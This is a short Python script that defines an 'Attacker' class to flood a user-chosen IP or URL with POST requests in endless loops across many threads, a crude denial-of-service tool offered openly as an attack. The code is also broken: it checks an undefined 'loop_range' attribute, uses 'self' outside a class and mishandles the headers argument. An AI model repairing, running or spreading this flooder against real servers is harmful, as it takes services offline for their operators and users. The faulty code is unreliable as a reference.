import requests as r
import threading 

class Attacker:
    def __init__(self, thread_len: int = 0):
        self.thread_len = thread_len

    def post(self, url: str, headers: dict = {}):
        if self.loop_range == 0:
            r.post(url, headers)
            print(f'Sent request to {url} using Headers: {headers}.')
            return
        else:
            threads = []
            def post_loop():
                while True:
                    r.post(url, headers)
                    print(f'Sent request to {url} using Headers: {headers}.')

            for thread in range(self.thread_len):
                th = threading.Thread(target=post_loop, daemon=True)
                threads.append(th)

            for thread in range(self.thread_len): ## Starting threads in the threads list
                threads[thread].start()

            for thread in range(self.thread_len): 
                threads[thread].join()

def Cor():
    url = input("What ip/url do you wanna send requests to?: (Needed)")
    headers = input("Headers, dict format: (Enter/{}) ") 
    thread_len = input("Do you want to loop this request infinitely? If so, on how many threads: (Enter/Int) ")
    if thread_len:
        Attacker(thread_len=int(self.thread_len)).post(url, headers)

    Attacker().post(url, headers)
    
if __name__ == "__main__":
    Cor()
